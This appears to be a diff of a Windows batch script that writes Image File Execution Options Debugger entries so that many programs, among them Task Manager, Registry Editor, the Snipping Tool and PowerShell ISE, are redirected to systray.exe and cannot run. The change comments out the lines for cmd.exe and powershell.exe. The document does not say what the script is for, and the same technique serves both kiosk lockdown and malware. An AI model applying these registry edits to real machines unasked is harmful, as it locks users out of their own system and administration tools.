@@ -168,8 +168,7 @@ set "IFEO=HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution
 reg add "%IFEO%\mspaint.exe" /v Debugger /t REG_SZ /d "systray.exe" /f
 reg add "%IFEO%\SnippingTool.exe" /v Debugger /t REG_SZ /d "systray.exe" /f
 reg add "%IFEO%\ScreenSketch.exe" /v Debugger /t REG_SZ /d "systray.exe" /f
-reg add "%IFEO%\cmd.exe" /v Debugger /t REG_SZ /d "systray.exe" /f
-reg add "%IFEO%\powershell.exe" /v Debugger /t REG_SZ /d "systray.exe" /f
+REM reg add "%IFEO%\powershell.exe" /v Debugger /t REG_SZ /d "systray.exe" /f
 reg add "%IFEO%\powershell_ise.exe" /v Debugger /t REG_SZ /d "systray.exe" /f
 reg add "%IFEO%\regedit.exe" /v Debugger /t REG_SZ /d "systray.exe" /f
 reg add "%IFEO%\taskmgr.exe" /v Debugger /t REG_SZ /d "systray.exe" /f
@@ -198,6 +197,7 @@ reg add "%IFEO%\VideoPlayer.exe" /v Debugger /t REG_SZ /d "systray.exe" /f
 reg add "%IFEO%\J-Player.exe" /v Debugger /t REG_SZ /d "systray.exe" /f
 reg add "%IFEO%\Registry_Management.exe" /v Debugger /t REG_SZ /d "systray.exe" /f
 reg add "%IFEO%\iexplore.exe" /v Debugger /t REG_SZ /d "systray.exe" /f
+REM reg add "%IFEO%\cmd.exe" /v Debugger /t REG_SZ /d "systray.exe" /f
 REM reg add "%IFEO%\seclogon.exe" /v Debugger /t REG_SZ /d "systray.exe" /f
 REM reg add "%IFEO%\runas.exe" /v Debugger /t REG_SZ /d "systray.exe" /f
 REM reg add "%IFEO%\WmsShell.exe" /v Debugger /t REG_SZ /d "systray.exe" /f
